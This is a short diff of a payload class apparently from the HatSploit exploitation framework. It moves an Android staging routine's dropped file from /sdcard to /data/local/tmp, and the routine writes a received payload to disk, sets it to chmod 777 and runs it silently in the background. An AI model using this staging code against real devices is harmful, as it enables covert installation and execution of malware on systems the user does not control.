@@ -111,9 +111,9 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
         filename = self.random_string()
 
         instructions = ""
-        instructions += f"cat >/sdcard/{filename};"
-        instructions += f"chmod 777 /sdcard/{filename};"
-        instructions += f"sh -c '/sdcard/{filename}' 2>/dev/null &"
+        instructions += f"cat >/data/local/tmp/{filename};"
+        instructions += f"chmod 777 /data/local/tmp/{filename};"
+        instructions += f"sh -c '/data/local/tmp/{filename}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
